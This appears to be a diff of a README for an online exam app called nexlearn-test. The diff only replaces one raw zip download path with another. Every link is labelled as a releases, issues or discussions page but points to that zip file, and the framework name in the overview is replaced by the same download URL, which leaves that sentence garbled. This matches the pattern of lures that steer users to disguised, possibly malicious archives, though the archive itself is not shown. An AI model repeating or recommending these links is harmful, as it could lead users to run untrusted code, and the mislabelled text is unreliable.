@@ -1,16 +1,16 @@
 # 🎓 nexlearn-test - Your Online Exam Made Easy
 
 ## 🔥 Overview
-nexlearn-test is a fully responsive online exam platform. Built with https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip 16 and Tailwind CSS, it provides a user-friendly experience for test-taking. The platform includes JWT authentication and utilizes Redux Toolkit for state management. Enjoy a clean and pixel-perfect UI based on professional Figma designs.
+nexlearn-test is a fully responsive online exam platform. Built with https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip 16 and Tailwind CSS, it provides a user-friendly experience for test-taking. The platform includes JWT authentication and utilizes Redux Toolkit for state management. Enjoy a clean and pixel-perfect UI based on professional Figma designs.
 
 ## 📥 Download Now
-[![Download nexlearn-test](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip)](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip)
+[![Download nexlearn-test](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip)](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip)
 
 ## 🚀 Getting Started
 To get started with nexlearn-test, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Locate the version you want to download. Click on the appropriate release link to download the app to your computer.
@@ -53,13 +53,13 @@ If you encounter any issues while using the application, here are some common so
 ## 📞 Support
 For support or inquiries:
 
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip) to report problems or ask questions.
-- Join the community discussions on our [Discussions page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip) for tips and advice from other users.
+- Visit our [GitHub Issues page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip) to report problems or ask questions.
+- Join the community discussions on our [Discussions page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip) for tips and advice from other users.
 
 ## 🔄 Update the Application
 To stay up-to-date:
 
-1. **Check for Updates**: Periodically visit our [Releases page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip) for the latest versions.
+1. **Check for Updates**: Periodically visit our [Releases page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip) for the latest versions.
 2. **Download New Versions**: Follow the same steps to download and install new releases.
 
 ## ✨ Additional Resources
@@ -81,6 +81,6 @@ Your involvement helps make the platform better for everyone.
 nexlearn-test is open-source software released under the MIT License. You may use, modify, and distribute the software according to the terms of the license.
 
 ## 🔗 Download & Install
-To install nexlearn-test, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/app/exam/nexlearn-test-v1.3.zip). Follow the steps outlined above for a smooth installation process.
+To install nexlearn-test, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Aarxnlol/nexlearn-test/main/components/test_nexlearn_2.5.zip). Follow the steps outlined above for a smooth installation process.
 
 Feel free to explore the features and capabilities of nexlearn-test. Happy testing!
